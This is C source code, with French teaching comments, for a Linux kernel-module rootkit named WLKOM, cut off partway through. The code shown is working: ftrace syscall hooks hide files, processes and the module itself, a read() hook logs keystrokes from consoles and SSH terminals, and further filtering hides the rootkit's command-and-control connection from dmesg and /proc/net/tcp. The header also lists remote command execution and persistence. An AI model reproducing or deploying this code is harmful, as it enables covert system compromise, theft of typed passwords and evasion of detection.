/*
 * ============================================================================
 *  WLKOM - Wild Linux Kernel Object Module
 *  Rootkit LKM (Loadable Kernel Module) pour Linux
 * ============================================================================
 *
 *  Ce fichier est le code source complet du rootkit. Il s'agit d'un module
 *  noyau Linux qui, une fois charge avec insmod, va :
 *
 *  1. Se connecter a un serveur C2 (Command & Control) via TCP
 *  2. Se cacher du systeme (lsmod, ps, ls, ss, dmesg...)
 *  3. Persister au reboot (copie dans /lib/modules + config modprobe)
 *  4. Executer des commandes a distance
 *  5. Telecharger/envoyer des fichiers
 *  6. Capturer les frappes clavier (keylogger)
 *  7. Chiffrer toutes les communications (ChaCha20-Poly1305)
 *
 *  Le rootkit utilise ftrace pour hooker (intercepter) les appels systeme
 *  du noyau, ce qui lui permet de filtrer ce que l'utilisateur voit.
 *
 * ============================================================================
 *  GLOSSAIRE DES CONCEPTS FONDAMENTAUX
 * ============================================================================
 *
 *  LKM (Loadable Kernel Module) :
 *    Un bout de code qu'on peut charger dans le noyau Linux SANS recompiler
 *    tout le kernel. On charge avec `insmod module.ko` et on retire avec
 *    `rmmod module`. Les drivers (carte reseau, USB, etc.) sont des LKM.
 *    Notre rootkit se fait passer pour un module normal.
 *
 *  NOYAU (Kernel) vs USERLAND :
 *    Linux a deux espaces memoire separes :
 *    - Userland (espace utilisateur) : ou tournent les programmes normaux
 *      (ls, bash, firefox...). Acces restreint, ne peut pas toucher au hardware.
 *    - Kernelland (espace noyau) : ou tourne le noyau. Acces TOTAL a la
 *      memoire, au hardware, aux processus. Un bug ici = crash du systeme.
 *    Notre rootkit tourne en kernelland → il a un pouvoir absolu.
 *
 *  SYSCALL (Appel systeme) :
 *    Quand un programme veut faire quelque chose (lire un fichier, lister
 *    un repertoire, envoyer un paquet reseau...), il demande au noyau via
 *    un "syscall". Par exemple :
 *    - ls appelle getdents64() pour lister les fichiers
 *    - cat appelle read() pour lire un fichier
 *    - ss appelle recvmsg() pour recevoir les infos reseau
 *    En interceptant ces syscalls, on controle ce que les programmes voient.
 *
 *  HOOK (Crochet/Interception) :
 *    Un hook, c'est quand on REMPLACE une fonction par la notre.
 *    Exemple : le vrai getdents64 retourne [fichier1, wlkom.ko, fichier2].
 *    Notre hook appelle le vrai, recoit la liste, SUPPRIME wlkom.ko,
 *    et retourne [fichier1, fichier2]. L'utilisateur ne voit jamais wlkom.ko.
 *    C'est comme mettre un filtre devant les yeux du systeme.
 *
 *  FTRACE :
 *    Framework de tracage integre au noyau Linux. Normalement utilise pour
 *    le debug/profiling. On le detourne pour hooker les syscalls.
 *    Avantage : c'est une API officielle du noyau, donc stable entre versions.
 *    Alternative (ancienne) : modifier directement la sys_call_table (risque).
 *
 *  printk() :
 *    C'est le printf() du noyau. Les messages vont dans le "ring buffer"
 *    du noyau (visible avec `dmesg`). Niveaux :
 *    - KERN_ERR : erreur critique
 *    - KERN_INFO : information
 *    - KERN_DEBUG : debug (pas affiche par defaut)
 *    ATTENTION : nos printk sont filtrees par notre propre hook read !
 *    (sinon on se verrait dans dmesg)
 *
 *  kmalloc() / kfree() :
 *    Equivalent de malloc()/free() en noyau. Alloue de la memoire dans
 *    le heap du kernel. GFP_KERNEL = flag "on peut dormir si necessaire".
 *    vmalloc() : pareil mais pour des gros blocs (non contigu en physique).
 *
 *  spinlock :
 *    Verrou ultra-rapide pour le noyau. Quand un CPU prend le lock,
 *    les autres CPU qui veulent le meme lock TOURNENT EN BOUCLE (spin)
 *    en attendant. Utilise quand le lock est tenu tres peu de temps.
 *    spin_lock_irqsave() : prend le lock ET desactive les interruptions
 *    (empeche un timer ou une IRQ de nous interrompre pendant qu'on a le lock).
 *
 *  kthread (Kernel Thread) :
 *    Un thread qui tourne dans le noyau (pas en userland). Il n'a pas
 *    de processus utilisateur associe. On le cree avec kthread_run().
 *    Notre thread C2 principal est un kthread qui boucle indefiniment.
 *
 *  copy_from_user() / copy_to_user() :
 *    Le noyau ne peut PAS acceder directement a la memoire d'un programme.
 *    Ces fonctions copient les donnees entre les deux espaces :
 *    - copy_from_user() : copie userland → kernel
 *    - copy_to_user() : copie kernel → userland
 *    Necessaires dans les hooks car les syscalls recoivent des pointeurs
 *    userland qu'on ne peut pas lire directement.
 *
 *  call_usermodehelper() :
 *    Demande au noyau de lancer un programme en userland.
 *    C'est comme si root tapait une commande. On l'utilise pour :
 *    - Executer des commandes shell (exec_cmd)
 *    - Configurer la persistence (set_persistence)
 *    Modes : UMH_WAIT_PROC (attendre la fin) ou UMH_NO_WAIT (fire and forget)
 *
 *  filp_open() / kernel_read() / kernel_write() :
 *    API pour manipuler des fichiers depuis le noyau.
 *    filp_open() ouvre un fichier, kernel_read() le lit, kernel_write() ecrit.
 *    Equivalent de fopen/fread/fwrite en userland.
 *
 *  struct pt_regs :
 *    Structure qui contient les registres CPU au moment du syscall.
 *    Sur x86_64, les arguments du syscall sont dans :
 *    - regs->di = 1er argument (ex: fd)
 *    - regs->si = 2eme argument (ex: buffer)
 *    - regs->dx = 3eme argument (ex: count)
 *    - regs->ip = Instruction Pointer (adresse de la prochaine instruction)
 *
 *  container_of() :
 *    Macro magique du noyau. A partir d'un pointeur vers un MEMBRE d'une
 *    structure, retrouve le pointeur vers la structure englobante.
 *    Exemple : si on a un pointeur vers hook->ops, container_of nous
 *    donne le pointeur vers le struct ftrace_hook qui contient ce ops.
 *
 *  list_del() :
 *    Retire un element d'une liste doublement chainee du noyau.
 *    Le noyau utilise des listes chainees PARTOUT (modules, processus...).
 *    En retirant notre module de la liste, lsmod ne le voit plus.
 *
 *  kobject_del() :
 *    Retire un objet du systeme de fichiers virtuel sysfs (/sys/).
 *    Ca supprime /sys/module/wlkom et l'entree dans /proc/modules.
 *
 *  THIS_MODULE :
 *    Macro qui pointe vers la structure module du module courant.
 *    Contient les metadonnees (nom, version, liste des hooks, etc.).
 *
 *  htons() / ntohs() / htonl() / ntohl() :
 *    Conversion entre byte order de la machine et byte order reseau.
 *    Reseau = big-endian (octet de poids fort en premier).
 *    x86 = little-endian (octet de poids faible en premier).
 *    htons = Host TO Network Short (16 bits)
 *    htonl = Host TO Network Long (32 bits)
 *
 *  AEAD (Authenticated Encryption with Associated Data) :
 *    Type de chiffrement qui garantit a la fois :
 *    - Confidentialite : personne ne peut lire le message
 *    - Integrite : personne ne peut modifier le message sans qu'on le detecte
 *    ChaCha20 = chiffrement, Poly1305 = authentification.
 *    Si un seul bit est modifie, le dechiffrement echoue (retourne une erreur).
 *
 *  Nonce (Number used ONCE) :
 *    Valeur unique utilisee une seule fois pour chaque chiffrement.
 *    Ici c'est un compteur (0, 1, 2, 3...) qui s'incremente a chaque message.
 *    Si on reutilise un nonce avec la meme cle, la securite est CASSEE.
 *
 *  Netlink :
 *    Protocole de communication entre le noyau et les programmes userland.
 *    ss (socket statistics) utilise NETLINK_SOCK_DIAG pour demander au noyau
 *    la liste des sockets ouvertes. En interceptant recvmsg sur ce type de
 *    socket, on peut cacher notre connexion C2 de ss et netstat.
 *
 *  /proc :
 *    Systeme de fichiers virtuel. Chaque processus a un dossier /proc/PID/.
 *    `ps` lit /proc/ pour lister les processus. En cachant le dossier de
 *    notre PID dans getdents64, notre processus disparait de ps.
 *
 *  Major/Minor (device numbers) :
 *    Chaque peripherique dans /dev/ a un major et un minor number.
 *    Major identifie le driver, Minor identifie l'instance.
 *    Major 4 = /dev/ttyN (consoles physiques)
 *    Major 136 = /dev/pts/N (pseudo-terminals, utilises par SSH)
 *    Le keylogger utilise ces numeros pour detecter les terminaux.
 *
 * ============================================================================
 */

/* ============================================================================
 *  INCLUDES - Bibliotheques du noyau Linux
 * ============================================================================
 *
 *  Contrairement au userland (programme normal), un module noyau n'a pas
 *  acces a la libc (printf, malloc, etc). On utilise les fonctions du noyau.
 */

#include <linux/module.h>       /* Macros pour definir un module (MODULE_LICENSE, etc) */
#include <linux/kernel.h>       /* printk() - equivalent de printf pour le noyau */
#include <linux/init.h>         /* __init, __exit - macros d'initialisation */
#include <linux/kthread.h>      /* kthread_run(), kthread_stop() - threads noyau */
#include <linux/delay.h>        /* msleep(), ssleep() - fonctions de pause */
#include <linux/net.h>          /* sock_create_kern(), kernel_connect() - sockets noyau */
#include <linux/in.h>           /* struct sockaddr_in, htons() - adresses reseau */
#include <linux/inet.h>         /* in_aton() - convertir IP texte en binaire */
#include <linux/fs.h>           /* filp_open(), kernel_read() - operations fichiers */
#include <linux/slab.h>         /* kmalloc(), kfree() - allocation memoire noyau */
#include <linux/dirent.h>       /* struct linux_dirent64 - entrees de repertoire */
#include <linux/kprobes.h>      /* kprobe - pour trouver les adresses des symboles noyau */
#include <linux/uaccess.h>      /* copy_from_user(), copy_to_user() - transfert user/kernel */
#include <crypto/hash.h>        /* crypto_alloc_shash() - API crypto du noyau (SHA-256) */
#include <net/sock.h>           /* kernel_sendmsg(), kernel_recvmsg() */
#include <linux/mm.h>           /* Gestion memoire */
#include <linux/vmalloc.h>      /* vmalloc(), vfree() - alloc de grandes zones memoire */
#include <linux/ftrace.h>       /* ftrace_set_filter_ip(), register_ftrace_function() */
#include <linux/version.h>      /* LINUX_VERSION_CODE - version du noyau */
#include <linux/random.h>       /* get_random_bytes() - generation aleatoire */
#include <crypto/chacha20poly1305.h> /* chacha20poly1305_encrypt/decrypt - chiffrement AEAD */
#include <linux/keyboard.h>     /* register_keyboard_notifier() - capture clavier */
#include <linux/input.h>        /* Evenements d'entree (clavier, souris) */
#include <linux/file.h>         /* fget(), fput() - references de fichiers */
#include <linux/netlink.h>      /* struct nlmsghdr - messages netlink */
#include <linux/inet_diag.h>    /* struct inet_diag_msg - diagnostic socket (pour cacher ss) */
#include <linux/sock_diag.h>    /* NETLINK_SOCK_DIAG, SOCK_DIAG_BY_FAMILY */

/* ============================================================================
 *  METADONNEES DU MODULE
 * ============================================================================
 *
 *  Ces macros definissent les informations du module visibles avec `modinfo`.
 *  MODULE_LICENSE("GPL") est OBLIGATOIRE sinon le noyau refuse certains symboles.
 *  MODULE_SOFTDEP indique que le module a besoin de libchacha20poly1305.
 */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wlkom");
MODULE_DESCRIPTION("Wild Linux Kernel Object Module");
MODULE_VERSION("1.4");
MODULE_SOFTDEP("pre: libchacha20poly1305");

/* ============================================================================
 *  PARAMETRES DU MODULE
 * ============================================================================
 *
 *  Ces variables sont configurables au chargement du module via insmod :
 *    insmod wlkom.ko pw_hash="abc123..." c2_ip="192.168.1.1" c2_port=9999
 *
 *  module_param() enregistre la variable comme parametre du module.
 *  0400 = permissions lecture seule pour root dans /sys/module/
 */

static char *pw_hash = "";                  /* Hash SHA-256 du mot de passe (64 chars hex) */
module_param(pw_hash, charp, 0400);
static char *c2_ip = "192.168.122.167";      /* IP du serveur C2 (VM attaquante) */
static int c2_port = 9999;                  /* Port TCP du serveur C2 */
module_param(c2_ip, charp, 0400);
module_param(c2_port, int, 0400);

/* ============================================================================
 *  VARIABLES GLOBALES
 * ============================================================================ */

static struct task_struct *c2_thread;       /* Pointeur vers le thread noyau principal */
static int running = 1;                    /* Flag pour arreter le thread proprement */
static struct socket *c2_sock = NULL;       /* Socket TCP vers le C2 */
static int authenticated = 0;              /* 1 si le mot de passe rootkit a ete valide */
static struct list_head *prev_module;       /* Sauvegarde du pointeur avant hide_module() */

/* ============================================================================
 *  PROCESS HIDING - Cacher des processus de ps
 * ============================================================================
 *
 *  On maintient un tableau de PIDs a cacher. Quand un programme fait `ls /proc/`
 *  (qui appelle getdents64), notre hook verifie si chaque PID est dans ce tableau.
 *  Si oui, on le supprime du resultat.
 *
 *  DEFINE_SPINLOCK : verrou pour proteger l'acces concurrent au tableau.
 *  En noyau, plusieurs CPUs peuvent acceder aux donnees en meme temps.
 */

#define MAX_HIDDEN_PIDS 32                  /* Maximum de PIDs qu'on peut cacher */
static pid_t hidden_pids[MAX_HIDDEN_PIDS];  /* Tableau des PIDs caches */
static int hidden_pid_count = 0;            /* Nombre de PIDs actuellement caches */
static DEFINE_SPINLOCK(pid_lock);           /* Verrou spinlock pour acces concurrent */

/* ============================================================================
 *  KEYLOGGER - Capture des frappes clavier
 * ============================================================================
 *
 *  Le keylogger utilise un ring buffer (buffer circulaire) de 4096 octets.
 *  Quand le buffer est plein, il revient au debut (ecrase les anciennes donnees).
 *  Le buffer est vide a chaque lecture via KEYLOG_DUMP.
 */

#define KEYLOG_BUF_SIZE 4096                /* Taille du buffer de capture */
static char keylog_buf[KEYLOG_BUF_SIZE];    /* Buffer circulaire des frappes */
static int keylog_pos = 0;                  /* Position actuelle dans le buffer */
static DEFINE_SPINLOCK(keylog_lock);        /* Verrou pour acces concurrent */
static int keylogger_active = 0;            /* 1 si le keylogger est actif */

/* ============================================================================
 *  CHACHA20-POLY1305 - Constantes de chiffrement
 * ============================================================================
 *
 *  ChaCha20-Poly1305 est un algorithme AEAD (Authenticated Encryption with
 *  Associated Data). Il chiffre ET authentifie les donnees :
 *  - ChaCha20 : chiffrement par flux (remplace AES)
 *  - Poly1305 : MAC (Message Authentication Code) - verifie l'integrite
 *
 *  Le "tag" (16 octets) est ajoute a la fin du message chiffre.
 *  Si un seul bit est modifie en transit, le dechiffrement echoue.
 *
 *  Le nonce (8 octets) est un compteur qui s'incremente a chaque message.
 *  Il garantit qu'un meme message produit un chiffre different a chaque envoi.
 */

#define CRYPTO_TAG_SIZE  CHACHA20POLY1305_AUTHTAG_SIZE  /* 16 octets */
#define CRYPTO_NONCE_SIZE 8                             /* 8 octets */
#define CRYPTO_HDR_SIZE  (4 + CRYPTO_NONCE_SIZE)        /* 4 (taille) + 8 (nonce) = 12 */

static u8 crypto_key[CHACHA20POLY1305_KEY_SIZE];  /* Cle de 256 bits (32 octets) */
static u64 send_nonce_ctr = 0;                    /* Compteur de nonce (s'incremente) */
static int crypto_ready = 0;                      /* 1 quand la cle a ete derivee */

/* ============================================================================
 *  INFRASTRUCTURE FTRACE - Systeme de hook des syscalls
 * ============================================================================
 *
 *  Ftrace est un framework de tracage integre au noyau Linux.
 *  On l'utilise pour INTERCEPTER les appels systeme (syscalls).
 *
 *  Principe :
 *  1. On trouve l'adresse de la fonction syscall (ex: __x64_sys_getdents64)
 *  2. On enregistre un callback ftrace sur cette adresse
 *  3. A chaque appel de la fonction, ftrace execute notre callback
 *  4. Notre callback remplace l'adresse de retour par notre fonction hook
 *  5. Notre hook appelle la vraie fonction, modifie le resultat, et retourne
 *
 *  C'est plus propre et stable que de modifier directement la sys_call_table.
 */

/* Structure qui represente un hook :
 * - name : nom du symbole noyau a hooker (ex: "__x64_sys_getdents64")
 * - function : pointeur vers notre fonction de remplacement
 * - original : pointeur vers la fonction originale (pour l'appeler depuis notre hook)
 * - address : adresse memoire du symbole resolu
 * - ops : structure ftrace interne
 */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

/*
 * wlkom_ksym() - Trouver l'adresse d'un symbole noyau
 *
 * Depuis Linux 5.7, kallsyms_lookup_name() n'est plus exporte.
 * On utilise kprobe comme astuce : on enregistre un kprobe sur le symbole,
 * on recupere son adresse, puis on le desenregistre immediatement.
 *
 * Parametres :
 *   n - nom du symbole (ex: "__x64_sys_getdents64")
 *
 * Retourne :
 *   L'adresse du symbole, ou 0 si non trouve
 */
static unsigned long wlkom_ksym(const char *n)
{
    struct kprobe kp = { .symbol_name = n };
    unsigned long a;
    if (register_kprobe(&kp) < 0) return 0;  /* Symbole pas trouve */
    a = (unsigned long)kp.addr;               /* Recupere l'adresse */
    unregister_kprobe(&kp);                   /* Libere le kprobe */
    return a;
}

/*
 * ftrace_thunk() - Callback ftrace qui redirige l'execution
 *
 * Cette fonction est appelee par ftrace CHAQUE FOIS que la fonction hookee
 * est appelee. Elle modifie le registre IP (Instruction Pointer) pour
 * faire executer notre fonction hook a la place de l'originale.
 *
 * "notrace" empeche ftrace de tracer cette fonction elle-meme (evite la recursion).
 *
 * within_module() verifie que l'appelant n'est PAS notre module.
 * Sans cette verification, quand notre hook appelle la fonction originale,
 * ftrace se redeclencherait et on bouclerait a l'infini.
 */
static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    /* Si c'est notre module qui appelle, ne pas rediriger (sinon boucle infinie) */
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;  /* Redirige vers notre hook */
}

/*
 * fh_install_hook() - Installer un hook ftrace
 *
 * Etapes :
 * 1. Resoudre le symbole (trouver son adresse avec kprobe)
 * 2. Sauvegarder l'adresse originale (pour que le hook puisse appeler la vraie fonction)
 * 3. Configurer les options ftrace (sauvegarder registres, modifier IP)
 * 4. Enregistrer le filtre (dire a ftrace quelle adresse surveiller)
 * 5. Activer le hook (register_ftrace_function)
 */
static int fh_install_hook(struct ftrace_hook *hook)
{
    int err;

    /* 1. Resoudre le symbole noyau */
    hook->address = wlkom_ksym(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "wlkom: symbol %s not found\n", hook->name);
        return -ENOENT;
    }

    /* 2. Sauvegarder l'adresse de la fonction originale */
    *((unsigned long *)hook->original) = hook->address;

    /* 3. Configurer ftrace :
     *    SAVE_REGS : sauvegarder les registres CPU (on en a besoin pour modifier IP)
     *    RECURSION : activer la protection anti-recursion
     *    IPMODIFY  : autoriser la modification du registre IP (indispensable)
     */
    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;

    /* 4. Filtrer : surveiller uniquement l'adresse de notre symbole */
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_ERR "wlkom: ftrace_set_filter_ip(%s) = %d\n",
               hook->name, err);
        return err;
    }

    /* 5. Activer le hook */
    err = register_ftrace_function(&hook->ops);
    if (err) {
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        printk(KERN_ERR "wlkom: register_ftrace(%s) = %d\n",
               hook->name, err);
        return err;
    }
    return 0;
}

/*
 * fh_remove_hook() - Desinstaller un hook ftrace
 * Inverse de fh_install_hook : desenregistre la fonction et retire le filtre.
 */
static void fh_remove_hook(struct ftrace_hook *hook)
{
    if (!hook->address) return;
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

/* ============================================================================
 *  HOOK GETDENTS64 - Cacher des fichiers et des processus de ls et ps
 * ============================================================================
 *
 *  getdents64 est le syscall utilise par ls, find, readdir(), etc.
 *  Il retourne la liste des fichiers d'un repertoire.
 *
 *  Notre hook :
 *  1. Appelle le vrai getdents64 (obtient la liste complete)
 *  2. Copie le resultat du userland vers le kernel (copy_from_user)
 *  3. Parcourt chaque entree et supprime celles qui contiennent "wlkom" ou "zroot"
 *  4. Supprime aussi les PIDs caches (pour /proc/)
 *  5. Copie le resultat filtre vers le userland (copy_to_user)
 *
 *  Resultat : les fichiers/dossiers contenant "wlkom" ou "zroot" sont invisibles.
 *  Les processus caches (par PID) disparaissent de ps.
 */

/* Type de la fonction originale getdents64 */
typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
static orig_getdents64_t real_getdents64 = NULL;

/*
 * is_hidden_pid() - Verifie si un nom de fichier dans /proc est un PID cache
 *
 * Dans /proc/, chaque processus a un dossier nomme par son PID (ex: /proc/1234).
 * Cette fonction verifie si le nom est un nombre (PID) et s'il est dans notre
 * tableau hidden_pids[].
 */
static int is_hidden_pid(const char *name)
{
    long pid_val;
    int i;
    unsigned long flags;

    /* Le nom doit commencer par un chiffre 1-9 (les PIDs ne commencent pas par 0) */
    if (name[0] < '1' || name[0] > '9')
        return 0;
    /* Convertir le nom en nombre. Si ca echoue, ce n'est pas un PID. */
    if (kstrtol(name, 10, &pid_val) != 0)
        return 0;

    /* Verrouiller le tableau des PIDs (acces concurrent possible) */
    spin_lock_irqsave(&pid_lock, flags);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == (pid_t)pid_val) {
            spin_unlock_irqrestore(&pid_lock, flags);
            return 1;  /* PID trouve dans la liste : il est cache */
        }
    }
    spin_unlock_irqrestore(&pid_lock, flags);
    return 0;  /* PID pas dans la liste */
}

/*
 * hk_getdents64() - Hook du syscall getdents64
 *
 * Registres x86_64 pour getdents64(fd, dirp, count) :
 *   regs->di = fd (file descriptor du repertoire)
 *   regs->si = dirp (pointeur userland vers le buffer de sortie)
 *   regs->dx = count (taille du buffer)
 *
 * Chaque entree linux_dirent64 a un champ d_reclen (taille de l'entree)
 * et d_name (nom du fichier). On les parcourt une par une.
 */
static asmlinkage long hk_getdents64(const struct pt_regs *regs)
{
    /* Appeler la vraie fonction getdents64 */
    long ret = real_getdents64(regs);
    struct linux_dirent64 __user *ud = (void *)regs->si;  /* Buffer userland */
    struct linux_dirent64 *kd, *c;   /* kd = copie kernel, c = entree courante */
    unsigned long off = 0;           /* Offset dans le buffer */
    long nr;                         /* Nombre d'octets valides */

    if (ret <= 0) return ret;  /* Rien a filtrer */

    /* Allouer un buffer kernel et y copier les donnees userland */
    kd = kmalloc(ret, GFP_KERNEL);
    if (!kd) return ret;
    if (copy_from_user(kd, ud, ret)) { kfree(kd); return ret; }

    nr = ret;
    /* Parcourir chaque entree de repertoire */
    while (off < nr) {
        c = (void *)kd + off;

        /* Si le nom contient "wlkom", "zroot", ou est un PID cache */
        if (strstr(c->d_name, "wlkom") != NULL ||
            strstr(c->d_name, "zroot") != NULL ||
            is_hidden_pid(c->d_name)) {

            /* Supprimer cette entree : decaler la memoire vers la gauche */
            long r = nr - off - c->d_reclen;
            if (r > 0) memmove(c, (char *)c + c->d_reclen, r);
            nr -= c->d_reclen;  /* Reduire la taille totale */
            /* Ne pas avancer off : la prochaine entree est maintenant a la meme position */
        } else {
            off += c->d_reclen;  /* Passer a l'entree suivante */
        }
    }

    /* Copier le resultat filtre vers le userland */
    if (copy_to_user(ud, kd, nr)) {}
    kfree(kd);
    return nr;  /* Retourner la nouvelle taille (plus petite si on a filtre) */
}

/* Declaration du hook getdents64 */
static struct ftrace_hook getdents64_hook = {
    .name     = "__x64_sys_getdents64",  /* Nom du symbole noyau sur x86_64 */
    .function = hk_getdents64,           /* Notre fonction de remplacement */
    .original = &real_getdents64,        /* Ou sauvegarder l'adresse originale */
};

static int hide_files_active = 0;

/* Installer le hook getdents64 */
static void hide_files_init(void)
{
    if (fh_install_hook(&getdents64_hook) == 0) {
        hide_files_active = 1;
        printk(KERN_INFO "wlkom: hide files active (ftrace)\n");
    }
}

/* Desinstaller le hook getdents64 */
static void hide_files_exit(void)
{
    if (hide_files_active) {
        fh_remove_hook(&getdents64_hook);
        hide_files_active = 0;
    }
}

/* ============================================================================
 *  VARIABLES POUR LE MASQUAGE RESEAU
 * ============================================================================
 *
 *  /proc/net/tcp affiche les connexions en format hexadecimal.
 *  Ex: port 9999 = 0x270F, IP 192.168.122.167 = 0x607AA8C0 (little-endian)
 *  On prepare ces valeurs pour les filtrer dans le hook read.
 */

static char c2_port_hex[8];     /* Port en hex, ex: "270F" */
static char c2_ip_hex[16];      /* IP en hex little-endian, ex: "607AA8C0" */
static int net_hide_ready = 0;  /* 1 quand les valeurs hex sont pretes */

/* ============================================================================
 *  HOOK READ - Filtrer les lignes de fichiers + Capturer les frappes (keylogger)
 * ============================================================================
 *
 *  Le syscall read() est appele par TOUT ce qui lit un fichier :
 *  - cat, grep, less, dmesg, etc.
 *
 *  Notre hook fait DEUX choses :
 *
 *  A) KEYLOGGER : Si le read est sur un terminal (TTY/PTY), on capture
 *     les caracteres. Ca capture les sessions SSH (PTY major 136) et
 *     les consoles locales (TTY major 4).
 *
 *  B) FILTRAGE : Si le contenu lu contient "wlkom", "zroot", ou les
 *     hex de notre port/IP C2, on supprime ces lignes du resultat.
 *     Ca cache le rootkit de dmesg, /proc/net/tcp, et tout fichier lu.
 */

typedef asmlinkage long (*orig_read_t)(const struct pt_regs *);
static orig_read_t real_read = NULL;

/*
 * hk_read() - Hook du syscall read
 *
 * Registres x86_64 pour read(fd, buf, count) :
 *   regs->di = fd (file descriptor)
 *   regs->si = buf (buffer userland)
 *   regs->dx = count (nombre d'octets a lire)
 */
static asmlinkage long hk_read(const struct pt_regs *regs)
{
    long ret;
    char __user *ubuf;
    char *kbuf, *src, *dst, *end, *nl;
    long new_len;

    /* Appeler le vrai read() */
    ret = real_read(regs);
    if (ret <= 0)
        return ret;

    ubuf = (char __user *)regs->si;  /* Buffer userland ou les donnees ont ete ecrites */

    /* -------- PARTIE A : KEYLOGGER (capture des frappes clavier) -------- */
    /*
     * On capture uniquement si :
     * - Le keylogger est actif
     * - La lecture est petite (<=64 octets, typique d'un terminal : 1 char a la fois)
     * - Le fd pointe vers un terminal (character device, major 4 ou 136)
     *
     * Major 4  = /dev/ttyN  (console physique)
     * Major 136 = /dev/pts/N (pseudo-terminal, utilise par SSH)
     */
    if (keylogger_active && ret > 0 && ret <= 64) {
        unsigned int fd = (unsigned int)regs->di;
        struct file *f = fget(fd);  /* Obtenir la struct file a partir du fd */
        if (f) {
            struct inode *ino = file_inode(f);
            if (S_ISCHR(ino->i_mode)) {  /* C'est un character device ? */
                unsigned int maj = imajor(ino);
                if (maj == 4 || maj == 136) {  /* TTY ou PTY ? */
                    char tmp[64];
                    if (!copy_from_user(tmp, ubuf, ret)) {
                        unsigned long flags;
                        int i;
                        spin_lock_irqsave(&keylog_lock, flags);
                        for (i = 0; i < ret; i++) {
                            if (keylog_pos >= KEYLOG_BUF_SIZE - 2) {
                                keylog_pos = 0;  /* Buffer plein : retour au debut */
                            }
                            /* Caracteres imprimables (ASCII 0x20 a 0x7E) */
                            if (tmp[i] >= 0x20 && tmp[i] < 0x7f)
                                keylog_buf[keylog_pos++] = tmp[i];
                            /* Retour a la ligne */
                            else if (tmp[i] == '\r' || tmp[i] == '\n')
                                keylog_buf[keylog_pos++] = '\n';
                            /* Backspace (0x7F ou 0x08) : reculer d'un caractere */
                            else if (tmp[i] == 0x7f || tmp[i] == 0x08) {
                                if (keylog_pos > 0) keylog_pos--;
                            }
                        }
                        keylog_buf[keylog_pos] = '\0';
                        spin_unlock_irqrestore(&keylog_lock, flags);
                    }
                }
            }
            fput(f);  /* Liberer la reference au fichier */
        }
    }

    /* -------- PARTIE B : FILTRAGE DES LIGNES -------- */

    /* Copier les donnees lues vers un buffer kernel */
    kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, ubuf, ret)) {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    /* Verifier rapidement si le contenu a besoin d'etre filtre */
    {
        int has_wlkom = (strnstr(kbuf, "wlkom", ret) != NULL ||
                         strnstr(kbuf, "zroot", ret) != NULL);
        int has_net = (net_hide_ready && strnstr(kbuf, c2_port_hex, ret) != NULL);
        if (!has_wlkom && !has_net) {
            kfree(kbuf);
            return ret;  /* Rien a filtrer, retourner le resultat original */
        }
    }

    /*
     * Filtrer ligne par ligne :
     * On parcourt le buffer, et pour chaque ligne on verifie si elle contient
     * "wlkom", "zroot", ou les hex du port/IP C2.
     * Si oui, on la supprime (on ne la copie pas dans dst).
     * Si non, on la garde (memmove vers dst).
     */
    src = kbuf;
    dst = kbuf;
    end = kbuf + ret;

    while (src < end) {
        nl = memchr(src, '\n', end - src);  /* Chercher la fin de la ligne */
        if (nl) {
            long line_len = nl - src + 1;
            int hide = 0;
            if (strnstr(src, "wlkom", line_len) ||
                strnstr(src, "zroot", line_len))
                hide = 1;
            /* Filtrer aussi les lignes /proc/net/tcp qui contiennent notre port ET IP */
            if (!hide && net_hide_ready &&
                strnstr(src, c2_port_hex, line_len) &&
                strnstr(src, c2_ip_hex, line_len))
                hide = 1;
            if (!hide) {
                memmove(dst, src, line_len);
                dst += line_len;
            }
            src = nl + 1;
        } else {
            /* Derniere ligne (pas de \n a la fin) */
            long line_len = end - src;
            int hide = 0;
            if (strnstr(src, "wlkom", line_len) ||
                strnstr(src, "zroot", line_len))
                hide = 1;
            if (!hide && net_hide_ready &&
                strnstr(src, c2_port_hex, line_len) &&
                strnstr(src, c2_ip_hex, line_len))
                hide = 1;
            if (!hide) {
                memmove(dst, src, line_len);
                dst += line_len;
            }
            break;
        }
    }

    /* Copier le resultat filtre vers le userland si modifie */
    new_len = dst - kbuf;
    if (new_len != ret) {
        if (copy_to_user(ubuf, kbuf, new_len)) {
            kfree(kbuf);
            return ret;
        }
    }
    kfree(kbuf);
    return new_len;  /* Retourner la taille filtree */
}

/* Declaration du hook read */
static struct ftrace_hook read_hook = {
    .name     = "__x64_sys_read",
    .function = hk_read,
    .original = &real_read,
};

static int hide_lines_active = 0;

static void hide_lines_init(void)
{
    if (fh_install_hook(&read_hook) == 0) {
        hide_lines_active = 1;
        printk(KERN_INFO "wlkom: hide lines active (ftrace)\n");
    }
}

static void hide_lines_exit(void)
{
    if (hide_lines_active) {
        fh_remove_hook(&read_hook);
        hide_lines_active = 0;
    }
}

/* ============================================================================
 *  MASQUAGE RESEAU - Preparer les valeurs hex pour /proc/net/tcp
 * ============================================================================
 *
 *  /proc/net/tcp affiche les connexions au format :
 *    sl  local_address rem_address   ...
 *     0: 0100007F:270F 00000000:0000 ...
 *
 *  Les ports sont en hex (9999 = 270F).
 *  Les IPs sont en hex little-endian (192.168.122.167 = 607AA8C0).
 *
 *  On convertit nos valeurs pour les reconnaitre dans le hook read.
 */

static void net_hide_init(void)
{
    u32 ip_addr;
